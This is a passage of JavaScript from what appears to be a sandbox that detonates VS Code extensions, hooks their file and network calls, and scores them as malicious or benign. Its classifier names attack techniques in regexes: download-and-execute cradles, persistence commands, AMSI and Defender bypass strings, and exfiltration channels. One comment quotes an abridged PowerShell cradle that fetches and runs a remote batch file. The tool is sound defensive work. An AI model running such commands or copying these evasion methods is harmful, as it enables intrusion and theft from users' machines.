    }, 'CRITICAL');
    try {
      let body = '';
      if (opts && opts.body != null) body = typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body);
      recordBeacon({ transport: 'fetch', destination: String(url), method: (opts && opts.method) || 'GET', headers: opts && opts.headers, body });
      DI.scanExfil(String(url), String(url) + '\n' + body, logEvent);
    } catch (e) {}
    // Return a mock SSE-compatible response so the reader loop terminates cleanly
    const mockReader = {
      read:   () => Promise.resolve({ done: true, value: undefined }),
      cancel: () => Promise.resolve(),
      releaseLock: () => {},
    };
    return Promise.resolve({
      ok: true, status: 200, statusText: 'OK',
      headers: {
        get:     (k) => k.toLowerCase() === 'content-type' ? 'application/json' : null,
        has:     ()  => false,
        forEach: ()  => {},
      },
      body: {
        getReader:         () => mockReader,
        [Symbol.asyncIterator]: async function*() {},
      },
      json:        () => Promise.resolve({ findings: [], scanType: 'basic', scanSummary: 'No issues found' }),
      text:        () => Promise.resolve('{}'),
      arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),
      blob:        () => Promise.resolve(new Blob([])),
      clone:       function() { return this; },
    });
  };
  saved['__fetch_original__'] = origGlobalFetch;

  // ── FIX (Bug 2): Module._resolveFilename patch ─────────────────────────────
  // When sub-modules deep inside the extension call require('vscode') through
  // the REAL Node module system (not our sandboxedRequire), _resolveFilename
  // is invoked first to turn the name into a file path. We intercept here and
  // redirect 'vscode' to a synthetic cache key that holds our mock exports.
  const origResolveFilename = Module._resolveFilename.bind(Module);
  Module._resolveFilename = function patchedResolveFilename(request, parent, isMain, options) {
    if (request === 'vscode') return VSCODE_MOCK_CACHE_ID;
    return origResolveFilename(request, parent, isMain, options);
  };
  // Register our mock in require.cache under the synthetic key
  require.cache[VSCODE_MOCK_CACHE_ID] = {
    id: VSCODE_MOCK_CACHE_ID, filename: VSCODE_MOCK_CACHE_ID,
    loaded: true, exports: hooked.vscode, children: [], paths: [],
  };
  saved['__resolveFilename_original__'] = origResolveFilename;  // stored for restore

  // ── FIX (Bug 3b): follow-redirects patch in extension node_modules ─────────
  // axios uses follow-redirects as its http transport layer. Patching the
  // global http/https cache is not enough because follow-redirects caches
  // those references internally at load time. We replace the whole module.
  const followRedirectsPath = path.join(extensionDir, 'node_modules', 'follow-redirects', 'index.js');
  if (fs.existsSync(followRedirectsPath)) {
    saved[followRedirectsPath] = require.cache[followRedirectsPath];
    require.cache[followRedirectsPath] = {
      id: followRedirectsPath, filename: followRedirectsPath, loaded: true,
      exports: { http: hooked.http, https: hooked.https },
      children: [], paths: [],
    };
    process.stdout.write('  🔵 [HOOK] follow-redirects patched in extension node_modules\n');
  }

  // Also patch axios itself in the extension's node_modules so even if the
  // sandboxedRequire cache is bypassed, axios is still our hooked version
  const axiosPaths = [
    path.join(extensionDir, 'node_modules', 'axios', 'index.js'),
    path.join(extensionDir, 'node_modules', 'axios', 'lib', 'axios.js'),
  ];
  for (const axiosPath of axiosPaths) {
    if (fs.existsSync(axiosPath)) {
      saved[axiosPath] = require.cache[axiosPath];
      require.cache[axiosPath] = {
        id: axiosPath, filename: axiosPath, loaded: true,
        exports: hooked.axios, children: [], paths: [],
      };
      process.stdout.write(`  🔵 [HOOK] axios patched at ${axiosPath}\n`);
      break;  // only need to patch the first one found
    }
  }

  return function restoreRequireCache() {
    // Restore Module._resolveFilename
    if (saved['__resolveFilename_original__']) {
      Module._resolveFilename = saved['__resolveFilename_original__'];
    }
    delete require.cache[VSCODE_MOCK_CACHE_ID];

    // Restore process.platform / process.arch
    if (Object.prototype.hasOwnProperty.call(saved, '__platform_desc__')) {
      if (saved['__platform_desc__']) Object.defineProperty(process, 'platform', saved['__platform_desc__']);
    }
    if (Object.prototype.hasOwnProperty.call(saved, '__arch_desc__')) {
      if (saved['__arch_desc__']) Object.defineProperty(process, 'arch', saved['__arch_desc__']);
    }

    // Restore global.fetch
    if (Object.prototype.hasOwnProperty.call(saved, '__fetch_original__')) {
      if (saved['__fetch_original__'] === undefined) delete global.fetch;
      else global.fetch = saved['__fetch_original__'];
    }

    // Restore Function.prototype.toString cloaking guard
    if (typeof saved['__restore_tostring_guard__'] === 'function') saved['__restore_tostring_guard__']();

    // Restore all other cache patches
    const META_KEYS = ['__resolveFilename_original__', '__fetch_original__', '__platform_desc__', '__arch_desc__', '__restore_tostring_guard__'];
    for (const [resolved, original] of Object.entries(saved)) {
      if (META_KEYS.includes(resolved)) continue;
      if (original === undefined) delete require.cache[resolved];
      else require.cache[resolved] = original;
    }
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 12 — fs/promises Hook  (the modern promisified FS API)
// ─────────────────────────────────────────────────────────────────────────────

function createFsPromisesHook(fsHook) {
  const { promisify } = require('util');

  // Wrap the hooked synchronous/callback APIs into Promise-returning variants
  return {
    readFile:   (p, opts)         => new Promise((res, rej) => fsHook.readFile(p, opts, (e, d) => e ? rej(e) : res(d))),
    writeFile:  (p, data, opts)   => new Promise((res) => fsHook.writeFile(p, data, opts, () => res())),
    appendFile: (p, data, opts)   => new Promise((res) => fsHook.appendFile(p, data, opts, () => res())),
    unlink:     (p)               => new Promise((res) => fsHook.unlink(p, () => res())),
    rename:     (o, n)            => new Promise((res) => fsHook.rename(o, n, () => res())),
    mkdir:      (p, opts)         => new Promise((res) => fsHook.mkdir(p, opts, () => res())),
    stat:       (p, opts)         => require('fs').promises.stat(p, opts),
    lstat:      (p, opts)         => require('fs').promises.lstat(p, opts),
    readdir:    (p, opts)         => require('fs').promises.readdir(p, opts),
    access:     (p, mode)         => require('fs').promises.access(p, mode),
    // BUG FIX: this used to unconditionally pass through to the REAL
    // fs.promises.open(), returning a real FileHandle whose .write()/
    // .writeFile()/.truncate() reach real disk — a genuine `fs.promises`
    // write path was open regardless of every other hardening here. Only a
    // read-only open still reaches the real fs; any write/append/create/
    // truncate intent gets a fake handle whose mutating methods are no-ops.
    open: async (p, flags, mode) => {
      if (isReadOnlyFsFlags(flags)) return require('fs').promises.open(p, flags, mode);
      logEvent('fs', 'promises.open', { path: String(p), flags: String(flags) }, 'CRITICAL');
      return {
        fd: -1,
        write:     async () => ({ bytesWritten: 0, buffer: Buffer.alloc(0) }),
        writeFile: async () => undefined,
        truncate:  async () => undefined,
        chmod:     async () => undefined,
        chown:     async () => undefined,
        sync:      async () => undefined,
        close:     async () => undefined,
        read:      async () => ({ bytesRead: 0, buffer: Buffer.alloc(0) }),
        readFile:  async () => Buffer.alloc(0),
        stat:      async () => ({}),
      };
    },
    copyFile:   (src, dst, flags) => { logEvent('fs', 'promises.copyFile', { src: String(src), dst: String(dst) }, 'WARN'); return Promise.resolve(); },
    rm:         (p, opts)         => { logEvent('fs', 'promises.rm', { path: String(p) }, 'WARN'); return Promise.resolve(); },
    rmdir:      (p, opts)         => { logEvent('fs', 'promises.rmdir', { path: String(p) }, 'WARN'); return Promise.resolve(); },
    constants:  require('fs').constants,
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 13 — Extension Loader
// ─────────────────────────────────────────────────────────────────────────────

async function loadExtension(extensionDir) {
  const pkgPath = path.join(extensionDir, 'package.json');
  if (!fs.existsSync(pkgPath)) {
    throw new Error(`package.json not found in: ${extensionDir}`);
  }

  let pkg;
  try {
    pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
  } catch (e) {
    throw new Error(`Failed to parse package.json: ${e.message}`);
  }

  // Resolve the main entry point — try the declared main first, then fall
  // back to auto-detection so samples with a missing/blank/wrong "main" are
  // still analyzed (critical for full-dataset coverage).
  let mainFile = null;
  if (pkg.main) {
    const candidates = [
      path.resolve(extensionDir, pkg.main),
      path.resolve(extensionDir, pkg.main + '.js'),
      path.resolve(extensionDir, pkg.main, 'index.js'),
    ];
    for (const candidate of candidates) {
      if (fs.existsSync(candidate)) { mainFile = candidate; break; }
    }
  }

  if (!mainFile) {
    mainFile = autoDetectEntry(extensionDir, pkg);
    if (mainFile) {
      process.stdout.write(`  [*] "main" unusable — auto-detected entry: ${path.relative(extensionDir, mainFile)}\n`);
    }
  }

  if (!mainFile) {
    // Record as a coverage gap rather than crashing the whole batch.
    return { pkg, mainFile: null };
  }

  return { pkg, mainFile };
}

/**
 * autoDetectEntry — best-effort discovery of an extension's runnable entry
 * when package.json "main" is missing or points nowhere. Tries the common
 * VS Code build locations, then the "browser" field, then the largest bundled
 * .js file outside node_modules.
 */
function autoDetectEntry(extensionDir, pkg) {
  const common = [
    'dist/extension.js', 'out/extension.js', 'extension.js',
    'src/extension.js', 'lib/extension.js', 'build/extension.js',
    'dist/index.js', 'out/index.js', 'index.js',
  ];
  for (const rel of common) {
    const p = path.resolve(extensionDir, rel);
    if (fs.existsSync(p)) return p;
  }
  if (pkg.browser) {
    const p = path.resolve(extensionDir, pkg.browser.endsWith('.js') ? pkg.browser : pkg.browser + '.js');
    if (fs.existsSync(p)) return p;
  }
  // Fallback: largest .js file (excluding node_modules / test / map files)
  let best = null, bestSize = 0;
  const walk = (dir, depth) => {
    if (depth > 4) return;
    let entries; try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
    for (const ent of entries) {
      if (ent.name === 'node_modules' || ent.name.startsWith('.')) continue;
      const full = path.join(dir, ent.name);
      if (ent.isDirectory()) { walk(full, depth + 1); }
      else if (/\.js$/.test(ent.name) && !/\.(test|spec|min)\.js$/.test(ent.name)) {
        try { const s = fs.statSync(full).size; if (s > bestSize) { bestSize = s; best = full; } } catch (e) {}
      }
    }
  };
  walk(extensionDir, 0);
  return best;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 13b — Behavioural Verdict Classifier
//  Turns the raw event stream into an explainable MALICIOUS / SUSPICIOUS /
//  BENIGN label. Each contributing behaviour adds weighted points and a
//  human-readable reason, so the report justifies its verdict (needed for the
//  confusion-matrix evaluation in the write-up).
// ─────────────────────────────────────────────────────────────────────────────

function classifyVerdict(summary, events, beacons, stolen) {
  const reasons = [];
  let score = 0;
  const add = (pts, why) => { score += pts; reasons.push({ points: pts, reason: why }); };

  const cpFns      = events.filter(e => e.module === 'child_process').map(e => e.function_hooked);
  const hasExec    = cpFns.some(f => /exec|spawn|fork|execFile/.test(f));
  const hasSocket  = events.some(e => e.module === 'net' && /connect|createConnection|Socket/i.test(e.function_hooked));
  const hasEval    = (summary.eval_calls || 0) > 0;
  const hasDecrypt = (summary.crypto_decrypt_calls || 0) > 0;
  const hasNetwork = (summary.http_requests || 0) > 0 || beacons.length > 0 || hasSocket;
  const recon      = events.some(e => e.module === 'os' && /userInfo|homedir|hostname|networkInterfaces/.test(e.function_hooked));
  const secondStage= events.some(e => e.function_hooked === 'second_stage_analyzed');

  // Build the corpus of contacted destinations + shell commands for matching.
  const SKIP = new Set(['', 'localhost', '127.0.0.1', '0.0.0.0', '::1']);
  const dests = new Set();
  beacons.forEach(b => { if (b.host && !SKIP.has(b.host)) dests.add(b.host); if (b.destination) dests.add(b.destination); });
  (summary.unique_hosts_contacted || []).forEach(h => { if (!SKIP.has(h)) dests.add(h); });
  const destStr = [...dests].join(' ');
  // Full command corpus: command + args + file + modulePath (the malicious part
  // of a spawn is usually in the args, e.g. spawn('powershell', ['-Command','…curl…catbox…']))
  const cmds = events
    .filter(e => e.module === 'child_process' && e.arguments)
    .map(e => [e.arguments.command, e.arguments.args, e.arguments.file, e.arguments.modulePath].filter(Boolean).join(' '))
    .concat(summary.shell_commands_attempted || [])
    .join('  ||  ');
  const writes  = events.filter(e => e.module === 'fs' && e.arguments && e.arguments.path).map(e => String(e.arguments.path));
  const downloadsBinary =
    beacons.some(b => /\.(exe|dll|bin|ps1|scr|msi)\b/i.test(b.destination || '')) ||
    writes.some(p => /\.(exe|dll|scr|msi)\b/i.test(p));

  // Download-and-execute cradle: a LOLBIN (powershell/curl/certutil/…) is run
  // with a remote URL or a script/exe path — e.g. ETHCode's trojanised dep does
  //   powershell -Command … curl.exe … "https://files.catbox.moe/x.bat" -o $o; & $o
  const cradle = /(?:powershell|cmd\.exe|certutil|bitsadmin|mshta|wscript|cscript|\bcurl\b|\bwget\b|invoke-webrequest|\biwr\b)/i.test(cmds) &&
                 /(?:https?:\/\/|\.bat\b|\.ps1\b|\.exe\b|\.cmd\b|\.scr\b|\.hta\b|catbox|pastebin)/i.test(cmds);

  // ── High-signal behaviours ────────────────────────────────────────────────
  if (cradle)               add(55, 'download-and-execute cradle (LOLBIN fetches & runs a remote payload)');
  if (hasSocket && hasExec) add(60, 'reverse shell: raw TCP socket bound to a shell process');
  else if (hasExec)         add(35, 'spawns an OS process / shell via child_process');
  if (downloadsBinary && hasExec) add(45, 'downloads an executable and launches it (dropper)');
  else if (downloadsBinary)       add(30, 'downloads an executable/DLL payload');

  // ── Exfiltration: CONFIRMED closed loop vs. mere resemblance ──────────────
  // `data_stolen` is now true only when the taint layer joined a read we
  // observed to a send we observed. A payload that merely LOOKS like it holds a
  // secret (an extension's own bearer token, a fixture, user-typed input) lands
  // in `suspected_categories` and is scored as a hint, not as theft. That split
  // is what stops "posts a file containing the word SECRET=" being a MALICIOUS
  // verdict.
  if (stolen.data_stolen) {
    add(55, `exfiltrates sensitive data (proven read → send): ${stolen.categories.join(', ')}`);
  } else if ((stolen.suspected_categories || []).length) {
    add(15, `outbound payload resembles credentials but no matching read was observed: ${stolen.suspected_categories.join(', ')}`);
  }

  if (hasDecrypt && hasNetwork)   add(35, 'runtime-decrypts a payload (AES) then contacts the network');
  else if (hasEval && hasNetwork) add(35, 'evaluates dynamically-built code then contacts the network');
  else if (hasEval)               add(18, 'evaluates dynamically-built code (eval / new Function)');
  if (secondStage)                add(25, 'detonated a forked second-stage script');
  if (recon && hasNetwork)        add(30, 'collects host/user reconnaissance and transmits it');

  // Runtime host-reconnaissance battery: the executed command stream enumerates
  // accounts/privileges as well as system or network state.
  const RECON_ID  = /\bnet\s+user\b|\bnet\s+localgroup\b|whoami\s+\/(?:priv|all|groups)|\/etc\/passwd|getent\s+passwd|dscl\s+\.\s+-list|security\s+find-generic-password|\bqwinsta\b|\bnltest\b/i;
  const RECON_ANY = /\btasklist\b|\bsysteminfo\b|\bps\s+aux\b|\bwmic\b|\bipconfig\b|\bnetstat\b|\bifconfig\b|\barp\s+-a\b|\broute\s+print\b/i;
  if (RECON_ID.test(cmds) && RECON_ANY.test(cmds))
    add(40, 'executed a host reconnaissance battery (account/privilege enumeration + system probing)');

  // Autostart persistence attempted at runtime.
  if (/\breg(?:\.exe)?\s+add\b[^|]{0,120}(?:CurrentVersion\\?Run|\bRun\b)|\bschtasks\s+\/create|New-ItemProperty[^\n]{0,80}CurrentVersion|[\\\/]Startup[\\\/]|\bcrontab\s+-|LaunchAgents/i.test(cmds + ' ' + writes.join(' ')))
    add(40, 'establishes persistence (autostart registry key / scheduled task / startup folder / cron)');

  // Security-product evasion.
  if (/Add-MpPreference\s+-ExclusionPath|Set-MpPreference\s+-Disable|amsiInitFailed|AmsiScanBuffer/i.test(cmds))
    add(50, 'attempts security-product evasion (Defender exclusion / AMSI bypass)');

  // Encoded LOLBIN command — the payload is carried in the argument itself.
  if (/(?:powershell|pwsh)(?:\.exe)?[^\n]{0,60}\s-(?:e|en|enc|ec|encodedcommand)\s+[A-Za-z0-9+/=]{40,}|certutil(?:\.exe)?\s+(?:-decode|-urlcache)/i.test(cmds))
    add(50, 'LOLBIN executing an encoded/decoded payload (powershell -enc / certutil -decode)');

  // Host-fingerprint exfiltration: an outbound body containing a stable machine
  // identifier (machineId / MAC address / hostname+username) is unambiguous
  // reconnaissance theft — legitimate extensions do not ship your MAC off-box.
  const bodies = beacons.map(b => `${b.decoded || ''} ${b.body || ''}`).join('  ');
  const fingerprint =
    /\bmachine[_-]?id\b|\bmac[_-]?address\b|\b(?:[0-9a-f]{2}:){5}[0-9a-f]{2}\b/i.test(bodies) ||
    (/\bhostname\b/i.test(bodies) && /\busername\b/i.test(bodies));
  if (fingerprint) add(45, 'exfiltrates a host fingerprint (machineId / MAC / hostname+username)');

  // ── Suspicious destinations / commands ────────────────────────────────────
  const indicators = [
    [/ngrok|trycloudflare|\.tcp\.|localtunnel|serveo|loca\.lt|pinggy\.io/i, 50, 'tunnelled C2 endpoint (ngrok / cloudflare / tcp tunnel)'],
    [/mainnet-beta\.solana|devnet\.solana|api\.solana|solana\.com|helius-rpc\.com/i, 45, 'Solana RPC used as decentralized C2'],
    [/discord(app)?\.com\/api\/webhooks|hooks\.slack\.com\/services/i, 45, 'chat-app webhook used for exfiltration (Discord / Slack)'],
    [/api\.telegram\.org\/bot|sendMessage\?chat_id=|t\.me\//i, 45, 'Telegram bot API used as a C2 / exfiltration channel'],
    [/googleapis\.com\/calendar\/v3\/calendars\/[^\s"']+\/events|sheets\.googleapis\.com\/v4\/spreadsheets\/[^\s"']+\/values|script\.google\.com\/macros\/s\//i, 45, 'Google Calendar / Sheets / Apps Script abused as a dead-drop C2'],
    [/xn--/i, 40, 'punycode / typosquat domain'],
    [/herokuapp\.com|elasticbeanstalk|pythonanywhere|onrender\.com|\.repl\.co|glitch\.me|workers\.dev|vercel\.app|netlify\.app|\.run\.app|railway\.app|fly\.dev/i, 30, 'data sent to an ephemeral/free cloud backend (common C2 staging)'],
    [/function\.undefined|\.undefined\d|\bundefined\d+\.com/i, 35, 'auto-generated throwaway C2 domain'],
    [/\b(?!127\.|10\.|192\.168\.|169\.254\.|0\.)\d{1,3}(\.\d{1,3}){3}\b/, 35, 'hard-coded raw public IP address'],
    [/pastebin|paste\.ee|hastebin|0x0\.st|transfer\.sh|file\.io|catbox\.moe|gofile\.io|anonfiles|tmpfiles\.org/i, 35, 'anonymous paste / file-drop host'],
    [/stratum\+tcp:\/\/|xmrig|minexmr|supportxmr|nanopool\.org|c3pool|cryptonight/i, 50, 'crypto-mining pool / miner binary'],
    [/\.onion\b|\btor2web\b|\bi2p\b/i, 40, 'darknet (Tor/I2P) endpoint'],
  ];
  let suspiciousDest = false;
  for (const [re, pts, why] of indicators) {
    if (re.test(destStr) || re.test(cmds)) { add(pts, why); suspiciousDest = true; }
  }

  // Exfiltration: a request carrying a real body (POST/PUT) to a suspicious or
  // tunnelled endpoint — e.g. SecureCode uploads the open file's source code to
  // its ngrok C2. This lifts "contacted a bad host" up to "sent data to it".
  const exfilPost = suspiciousDest && beacons.some(b =>
    /^(POST|PUT|PATCH)$/i.test(b.method || '') && (b.body_bytes || (b.body || '').length) > 2);
  if (exfilPost) add(25, 'transmits a data payload to the suspicious/tunnelled endpoint (exfiltration)');

  // Baseline: any outbound transmission with no stronger signal is still notable.
  if (hasNetwork && reasons.length === 0) add(10, 'makes outbound network connections');

  let verdict = 'BENIGN';
  if (score >= 60)      verdict = 'MALICIOUS';
  else if (score >= 25) verdict = 'SUSPICIOUS';

  return {
    verdict,
    score,
    reasons,
    is_malicious: verdict === 'MALICIOUS' ? 1 : 0,   // strict positive
    is_flagged:   verdict === 'BENIGN' ? 0 : 1,       // MALICIOUS or SUSPICIOUS
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 13c — Threat-Intelligence Extraction (for the report's log breakdown)
//  Turns the raw event stream into the structured fields the write-up needs:
//   purpose/family, actions taken, data targeted, and the network/C2 picture.
// ─────────────────────────────────────────────────────────────────────────────

function deriveIntel(summary, events, beacons, stolen, verdict) {
  const ev   = (m, re) => events.filter(e => e.module === m && (!re || re.test(e.function_hooked)));
  const cp   = ev('child_process');
  const sock = ev('net', /connect|createConnection|Socket/i);
  const hasExec = cp.length > 0, hasSocket = sock.length > 0;
  const cmds   = cp.map(e => [e.arguments.command, e.arguments.args].filter(Boolean).join(' ')).join('  ||  ');
  const dests  = [...new Set(beacons.map(b => b.host || b.destination).filter(Boolean))];
  const bodies = beacons.map(b => `${b.decoded || ''} ${b.body || ''}`).join('  ');
  const destStr = dests.join(' ');
  const corpus = `${destStr}  ${bodies}  ${cmds}`;

  // ── Network / C2 picture ───────────────────────────────────────────────────
  const parseHostPort = (raw) => {
    let domain = '', ip = '', port = '';
    try {
      const u = new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(raw) ? raw : 'http://' + raw);
      domain = u.hostname; port = u.port;
    } catch (e) {
      const m = String(raw).match(/^([^:\/\s]+)(?::(\d+))?/); if (m) { domain = m[1]; port = m[2] || ''; }
    }
    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(domain)) { ip = domain; }
    return { domain, ip, port };
  };
  // A beaconing specimen can emit thousands of identical requests once the Time
  // Machine drains its setInterval; recording each one produced 10 MB `intel`
  // blobs. Deduplicate by endpoint and cap the list — the report needs the
  // distinct destinations and a count, not every repetition.
  const MAX_NETWORK = 200;
  const network = [];
  const seenEndpoint = new Map();
  const pushNet = (rec) => {
    const key = `${rec.transport}|${rec.method}|${rec.domain}|${rec.port}`;
    const prev = seenEndpoint.get(key);
    if (prev) { prev.repeat_count++; return; }
    if (network.length >= MAX_NETWORK) return;
    rec.repeat_count = 1;
    seenEndpoint.set(key, rec);
    network.push(rec);
  };
  for (const b of beacons) {
    const { domain, ip, port } = parseHostPort(b.destination || b.host || '');
    pushNet({ transport: b.transport, method: b.method || '', domain, ip, port,
              body_preview: (b.decoded || b.body || '').replace(/\s+/g, ' ').slice(0, 200) });
  }
  for (const e of sock) {
    const host = String(e.arguments.host || '');
    pushNet({ transport: 'tcp', method: 'CONNECT', domain: host,
              ip: /^\d{1,3}(\.\d{1,3}){3}$/.test(host) ? host : '', port: String(e.arguments.port || ''), body_preview: '' });
  }

  // ── Actions executed ───────────────────────────────────────────────────────
  const actions = [];
  const cradle = /(?:powershell|cmd\.exe|certutil|bitsadmin|curl|wget|invoke-webrequest|mshta)/i.test(cmds) &&
                 /(?:https?:\/\/|\.bat\b|\.ps1\b|\.exe\b|catbox|pastebin)/i.test(cmds);
  if (cradle)                                                   actions.push('Download-and-execute cradle (LOLBIN fetches & runs a remote payload)');
  if (hasExec)                                                  actions.push('Executed OS process / shell via child_process');
  if (ev('fs', /writeFile|createWriteStream|appendFile/).length) actions.push('Wrote file(s) to disk');
  if (summary.crypto_decrypt_calls > 0)                         actions.push('Runtime AES decryption (payload deobfuscation)');
  if (summary.eval_calls > 0)                                   actions.push('Dynamic code evaluation (eval / new Function)');
  if (events.some(e => e.function_hooked === 'second_stage_analyzed')) actions.push('Detonated a forked second-stage script');
  if (/installExtension/i.test(JSON.stringify(events).slice(0, 20000))) actions.push('Programmatically installed a VSIX (marketplace bypass)');
  if (/\b(?:reg(?:\.exe)?\s+add|schtasks|New-ItemProperty|HKCU|HKLM)\b/i.test(cmds)) actions.push('Modified Windows registry / scheduled-task persistence');
  if (/crontab|launchctl|systemctl|\.bashrc|LaunchAgents/i.test(cmds))            actions.push('Established *nix persistence (cron / launch agent)');
  if (beacons.length)                                          actions.push(`Outbound network transmission (${beacons.length} message(s))`);

  // ── Data targeted / stolen ─────────────────────────────────────────────────
  const stolenTypes = new Set(stolen.categories || []);
  if (/\bmachine[_-]?id\b/i.test(bodies))                       stolenTypes.add('machine_id');
  if (/\bmac[_-]?address\b|\b([0-9a-f]{2}:){5}[0-9a-f]{2}\b/i.test(bodies)) stolenTypes.add('mac_address');
  if (/\busername\b/i.test(bodies))                            stolenTypes.add('username');
  if (/\bhostname\b/i.test(bodies))                            stolenTypes.add('hostname');
  if (/\bhome[_-]?dir/i.test(bodies))                          stolenTypes.add('home_directory');
  if (/"code"\s*:|"source"\s*:/i.test(bodies))                 stolenTypes.add('editor_source_code');
  if (ev('os', /userInfo|networkInterfaces|hostname|homedir/).length) stolenTypes.add('host_reconnaissance');

  // ── Purpose / family (primary classification) ──────────────────────────────
  let purpose = 'Undetermined', families = [];
  if (/stratum\+tcp|xmrig|coinhive|minexmr|cryptonight|nanopool|supportxmr|c3pool/i.test(corpus)) { purpose = 'Crypto-miner'; families.push('miner'); }
  else if (hasSocket && hasExec)                                { purpose = 'Backdoor / Reverse shell'; families.push('reverse_shell'); }
  else if (cradle)                                             { purpose = 'Loader / Downloader (stager)'; families.push('downloader'); }
  else if (/\.(exe|dll|msi|scr)\b/i.test(destStr) || (hasExec && ev('fs', /writeFile|createWriteStream/).length)) { purpose = 'Dropper'; families.push('dropper'); }
  else if (stolenTypes.size && beacons.length)                 { purpose = 'Infostealer / Reconnaissance'; families.push('stealer'); }
  else if (beacons.length || hasSocket)                        { purpose = 'C2 beacon / Command-and-control client'; families.push('c2'); }
  else if (summary.eval_calls > 0 || summary.crypto_decrypt_calls > 0) { purpose = 'Obfuscated payload (staged execution)'; families.push('obfuscated'); }
  else                                                         { purpose = 'No malicious behaviour observed (dynamic)'; }

  // ── C2 indicator labels ─────────────────────────────────────────────────────
  const c2 = [];
  if (/ngrok|trycloudflare|\.tcp\.|localtunnel|serveo/i.test(destStr)) c2.push('tunnel (ngrok / cloudflare / tcp)');
  if (/mainnet-beta\.solana|api\.mainnet-/i.test(destStr))             c2.push('Solana RPC (blockchain C2)');
  if (/discord(?:app)?\.com\/api\/webhooks/i.test(destStr + bodies))   c2.push('Discord webhook');
  if (/api\.telegram\.org/i.test(destStr))                            c2.push('Telegram bot');
  if (/xn--/i.test(destStr))                                          c2.push('punycode / typosquat domain');
  if (network.some(n => n.ip))                                        c2.push('hard-coded raw IP');
  if (/herokuapp|elasticbeanstalk|pythonanywhere|onrender|workers\.dev|railway/i.test(destStr)) c2.push('ephemeral cloud backend');

  return {
    purpose,
    families,
    actions,
    data_targeted: [...stolenTypes],
    network,                                   // [{transport, method, domain, ip, port, body_preview}]
    c2_indicators: c2,
    detection: { final_verdict: verdict.verdict, score: verdict.score, confidence: verdict.score >= 90 ? 'high' : verdict.score >= 60 ? 'medium' : 'low' },
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 14 — Report Writer
// ─────────────────────────────────────────────────────────────────────────────

function writeReport(outputPath, pkg, error) {
  const events = LOG_EVENTS;

  // Compute per-module counts for the summary
  const count = (modName, fns = null) =>
    events.filter(e => e.module === modName && (!fns || fns.includes(e.function_hooked))).length;

  const summary = {
    total_events:            events.length,
    critical_events:         events.filter(e => e.severity === 'CRITICAL').length,
    child_process_calls:     count('child_process'),
    http_requests:           count('http') + count('https') + count('fetch'),
    fs_writes_blocked:       count('fs', ['writeFile','writeFileSync','appendFile','appendFileSync','createWriteStream','unlink','unlinkSync','rename','renameSync']),
    fs_reads:                count('fs', ['readFile','readFileSync']),
    eval_calls:              count('eval'),
    crypto_decrypt_calls:    count('crypto', ['createDecipheriv']),
    net_socket_calls:        count('net'),
    dns_lookups:             count('dns'),
    os_recon_calls:          count('os'),
    unique_hosts_contacted:  [...new Set(events.filter(e => e.arguments && e.arguments.url).map(e => { try { return new URL(e.arguments.url).hostname; } catch { return e.arguments.url; } }))],
    shell_commands_attempted:[...new Set(events.filter(e => e.arguments && e.arguments.command).map(e => e.arguments.command))],
  };

  // ── Sensitive-data intelligence: WHAT was read / stolen, and to WHERE ──────
  const stolen = DI.getStolenSummary();
  summary.data_stolen            = stolen.data_stolen;
  summary.stolen_categories      = stolen.categories;
  summary.exfil_destinations     = stolen.destinations;
  summary.secrets_read           = stolen.secrets_read;
  summary.outbound_message_count = BEACONS.length;

  // ── Behavioural verdict (explainable MALICIOUS / SUSPICIOUS / BENIGN) ──────
  const verdict = classifyVerdict(summary, events, BEACONS, stolen);

  // ── Threat-intel breakdown (purpose / actions / data / network) ────────────
  const intel = deriveIntel(summary, events, BEACONS, stolen, verdict);

  const report = {
    sandbox_version:    '2.2.0',
    analysis_timestamp: new Date().toISOString(),
    elapsed_ms:         Date.now() - START_TIME,
    spoofed_platform:   SPOOF_PLATFORM,
    spoofed_arch:       SPOOF_ARCH,
    time_machine:       TIME_MACHINE ? TIME_MACHINE.getStats() : undefined,
    target: {
      name:             pkg.name             || '',
      display_name:     pkg.displayName      || '',
      publisher:        pkg.publisher        || '',
      version:          pkg.version          || '',
      categories:       pkg.categories       || [],
      activation_events:pkg.activationEvents || [],
      main:             pkg.main             || '',
    },
    verdict,
    intel,
    summary,
    // Requirement: the full content of every message the extension sent out.
    outbound_messages: BEACONS,
    stolen_data: stolen,
    events,
    errors: error ? [error] : [],
  };

  fs.writeFileSync(outputPath, JSON.stringify(report, null, 2), 'utf8');

  // Print final summary to console
  const SEP = '═'.repeat(68);
  console.log('\n' + SEP);
  console.log('  DYNAMIC ANALYSIS COMPLETE');
  console.log(SEP);
  console.log(`  Extension          : ${report.target.display_name || report.target.name}`);
  console.log(`  Total events       : ${summary.total_events}  (critical: ${summary.critical_events})`);
  console.log(`  child_process      : ${summary.child_process_calls}   eval()/new Function : ${summary.eval_calls}`);
  console.log(`  http/https/fetch   : ${summary.http_requests}   crypto.decipher     : ${summary.crypto_decrypt_calls}`);
  console.log(`  fs writes (blocked): ${summary.fs_writes_blocked}   fs reads            : ${summary.fs_reads}`);
  console.log(`  net sockets        : ${summary.net_socket_calls}   dns lookups         : ${summary.dns_lookups}`);
  if (summary.unique_hosts_contacted.length) {
    console.log(`  Hosts contacted    : ${summary.unique_hosts_contacted.join(', ')}`);
  }
  if (summary.shell_commands_attempted.length) {
    console.log(`  Commands attempted : ${summary.shell_commands_attempted.join(' | ').slice(0, 100)}`);
  }
  if (stolen.secrets_read.length) {
    console.log(`  Sensitive reads    : ${stolen.secrets_read.join(', ')}`);
  }
  if (stolen.data_stolen) {
    console.log(`  ⚠ DATA STOLEN      : ${stolen.categories.join(', ')}`);
    console.log(`  Exfil destinations : ${stolen.destinations.join(', ')}`);
  }

  // ── Outbound messages (the supervisor-requested capture) ──────────────────
  if (BEACONS.length) {
    console.log(`  ${'-'.repeat(64)}`);
    console.log(`  OUTBOUND MESSAGES  : ${BEACONS.length} captured`);
    for (const b of BEACONS.slice(0, 6)) {
      console.log(`    → [${b.transport}] ${b.method} ${b.host || b.destination}`);
